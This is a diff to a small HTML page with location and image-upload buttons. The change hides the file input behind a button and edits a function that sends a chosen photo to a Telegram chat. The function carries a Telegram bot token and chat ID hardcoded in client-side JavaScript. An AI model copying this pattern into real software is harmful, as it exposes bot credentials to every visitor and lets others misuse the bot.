@@ -8,7 +8,8 @@
     <button onclick="getLocation()">Get Location</button>
     <p id="location"></p>
     
-    <input type="file" id="imageInput" accept="image/*">
+    <input type="file" id="imageInput" accept="image/*" style="display: none;">
+    <button onclick="document.getElementById('imageInput').click()">Upload Picture</button>
     <button onclick="sendImage()">Send Image</button>
 
     <script>
@@ -58,8 +59,8 @@
         }
 
         function sendImageToTelegram(file) {
-            var botToken = '7290471633:AAE0A_sbbmf8Z-Xm-1hsk7DCtXezNGiCpVkN';
-            var chatId = '1002148840772';
+            var botToken = '7290471633:AAE0A_sbbmf8Z-Xm-1hsk7DCtXezNGiCpVk';
+            var chatId = '-1002148840772';
             var formData = new FormData();
             formData.append("chat_id", chatId);
             formData.append("photo", file);
